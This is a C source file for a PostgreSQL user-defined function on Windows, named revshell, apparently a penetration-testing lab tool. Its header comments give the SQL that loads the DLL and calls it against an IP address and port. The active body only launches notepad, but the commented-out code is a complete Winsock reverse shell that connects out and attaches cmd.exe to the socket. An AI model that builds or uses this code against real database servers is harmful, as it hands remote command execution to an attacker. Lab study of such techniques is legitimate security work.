/*
Postgre UDF example, use with:
CREATE OR REPLACE FUNCTION revshell(text, integer) RETURNS integer AS 'C:\psql-udf.dll','revshell' LANGUAGE C STRICT;
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS 'C:\psql-udf.dll','dummy_function' LANGUAGE C STRICT;
SELECT revshell('192.168.1.235', 5555);

DEBUG:
net stop "service"
del c:\rev_shell_udf.dll
net start "service"

DROP FUNCTION revshell
SELECT * FROM pg_extension;
SELECT proname,prosrc FROM pg_proc WHERE proname='revshell';

REF:
https://www.highgo.ca/2020/05/15/build-postgresql-and-extension-on-windows/
http://big-elephants.com/2015-10/writing-postgres-extensions-part-i/
*/

#include "postgres.h"
#include "fmgr.h"
#include "utils/geo_decls.h"
#include "utils/builtins.h"
#pragma comment(lib, "ws2_32")

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <Windows.h>
#include <shellapi.h>

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum revshell(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(revshell);


struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;
WSADATA wsaData;
SOCKET s1;

Datum revshell(PG_FUNCTION_ARGS) {
    int ret = 0;
    ShellExecuteW(NULL, L"open", L"notepad.exe", NULL, NULL, 1);
    //if (WSAStartup(MAKEWORD(2, 2), &wsaData)) {
    //    elog(INFO, "[-] WSAStartup failed");
    //    ret = 1;
    //}
    //s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    //
    //text* t_ip = PG_GETARG_TEXT_P(0);
    //char* c_ip = text_to_cstring(t_ip);
    //int port = PG_GETARG_INT32(1);
    //unsigned long ulAddr = inet_addr(c_ip);
    //if (ulAddr == INADDR_NONE) {
    //    elog(INFO, "[-] inet_addr failed to parse ip");
    //    ret = 1;
    //}
    //hax.sin_family = AF_INET;
    //hax.sin_addr.s_addr = ulAddr;
    //hax.sin_port = htons(port);
    //
    //elog(INFO, "[*] trying to connect to %s:%d", c_ip, port);
    //if (WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL)) {
    //    // https://docs.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2
    //    ret = WSAGetLastError();
    //    elog(INFO, "[-] WSAConnect failed with %d", ret);
    //}
    //memset(&sui, 0, sizeof(sui));
    //sui.cb = sizeof(sui);
    //sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    //sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

    //if (!ret) {
    //    // CreateProcess = < Windows 10
    //    // CreateProcessW = Windows 10
    //    //if (!CreateProcessW(
    //    //    NULL,           // app path
    //    //    L"cmd.exe",     // command line
    //    //    NULL,           // process handle not inheritable
    //    //    NULL,           // thread handle not inheritable
    //    //    TRUE,           // handle inheritance enabled 
    //    //    0,              // no creation flags
    //    //    NULL,           // use parent's enviroment
    //    //    NULL,           // use parent's starting directory
    //    //    &sui,           // ptr to STARTUPINFO
    //    //    &pi             // ptr to PROCESS_INFORMATION
    //    //)) {
    //    //    // https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes
    //    //    ret = GetLastError();
    //    //    elog(INFO, "[-] CreateProcess failed with %d", ret);
    //    //}
    //    
    //    // launch the process passed in the first parameter
    //    ShellExecuteW(NULL, L"open", L"notepad.exe", NULL, NULL, 1);
    //    elog(INFO, "[+] executed shell");
    //}
    //WSACleanup();
    PG_RETURN_INT32(ret);
}